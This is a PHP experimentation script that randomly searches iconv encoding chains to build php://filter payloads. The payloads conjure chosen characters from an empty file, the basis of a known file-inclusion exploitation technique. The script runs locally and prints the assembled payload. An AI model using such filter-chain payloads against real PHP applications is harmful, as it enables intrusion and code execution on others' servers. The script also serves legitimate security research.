<?php
// Idea from https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d

function iconv_list_encodings() {
    return array_values(array_filter(preg_split('#//\n#', shell_exec('iconv -l'), -1, PREG_SPLIT_NO_EMPTY), function($s) {
        return !strstr($s, '/') && !strstr($s, "\n") && !strstr($s, ':') && !strstr($s, '.'); // && !strstr($s, 'EBC') && !strstr($s, 'IBM') && !strstr($s, 'IEC') && !strstr($s, 'MS') && strlen($s) <= 12;
        // return (!strstr($s, '/') && !strstr($s, "\n") && !strstr($s, ':')) && (strstr($s, 'UTF') || strstr($s, 'UCS'));
    }));
}

$encodings = iconv_list_encodings();
$conversions = [];


function b64_percent($s) {
    if (strlen($s) == 0) {
        return 1.0;
    }
    $cnt = 0;
    foreach(str_split($s) as $c) {
        if(ctype_alnum($c)||$c==='+'||$c==='/'||$c==='='){
            $cnt++;
        }
    }
    return $cnt / strlen($s);
}

function dfs($cur, $path, $target) {
    // if(b64_percent($cur) < 0.5) {
    //     return;
    // }
    global $encodings;
    $result = base64_encode(base64_decode($cur));
    if(strlen($result) === 8 && substr($result, 1) === 'abcdefg' && $result[0] !== 'C'){
        return array_merge($path, ['convert.base64-decode', 'convert.base64-encode']);
    }
    if(count($path) > 3) {
        return;
    }
    for($i = 0; $i < 100; $i++) {
        [$ink, $outk] = array_rand($encodings, 2);
        $in = $encodings[$ink];
        $out = $encodings[$outk];
        $s = @iconv($in, $out, $cur);
        if (strlen($s) > 0) {
            array_push($path, "convert.iconv.$in.$out");
            $r = dfs($s, $path, $target);
            if ($r) {
                return $r;
            }
            array_pop($path);
        }
        else {
            $i--;
        }
    }
}

function apply_filters($filters, $str) {
    foreach($filters as $f) {
        if (strstr($f, 'iconv')) {
            [,,$in, $out] = explode('.', $f);
            var_dump($str);
            echo "$in -> $out\n";
            $str = iconv($in, $out, $str);
        }
        else if ($f === 'convert.base64-decode') {
            var_dump($str);
            echo "b64d\n";
            $str = base64_decode($str);
        }
        else if ($f === 'convert.base64-encode') {
            var_dump($str);
            echo "b64e\n";
            $str = base64_encode($str);
        }
        else {
            echo 'UNK: '. $f . "\n";
        }
    }
    return $str;
}

// $path = explode('|', 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode');
// var_dump($path);
// var_dump(apply_filters($path, 'abcdefg'));
// exit();

$path = dfs('abcdefg', [], 'R');
var_dump($path);
var_dump(apply_filters($path, 'abcdefg'));
exit();

$file = 'empty.txt';
$base = file_get_contents($file);
$filters = [];

array_push($filters, 'convert.iconv.UTF8.CSISO2022KR');
array_push($filters, 'convert.iconv.UTF8.CSISO2022KR');
array_push($filters, 'convert.iconv.UTF8.CSISO2022KR');
array_push($filters, 'convert.base64-encode');
$filters = array_merge($filters, explode('|', 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2'));
array_push($filters, 'convert.base64-decode');
array_push($filters, 'convert.base64-encode');
$base = apply_filters($filters, $base);
var_dump($base);

// foreach(str_split(strrev(base64_encode('pek'))) as $c) {
//     $path = dfs(iconv('UTF8','CSISO2022KR', $base), ['convert.iconv.UTF8.CSISO2022KR'], $c);
//     if (!$path) {
//         die('not found');
//     }
//     var_dump($path);
//     $filters = array_merge($filters, $path);
//     $base = apply_filters($path, $base);
//     var_dump($base);

//     $final_filter = implode('|', $filters);
//     $file = 'empty.txt';
//     $payload = "php://filter/$final_filter/resource=$file";
//     var_dump(file_get_contents($payload));
// }

// array_push($filters, 'convert.base64-decode');
$final_filter = implode('|', $filters);
$file = 'empty.txt';
$payload = "php://filter/$final_filter/resource=$file";
echo $payload . "\n";
var_dump(file_get_contents($payload));

// strrev(base64_encode('pek'))
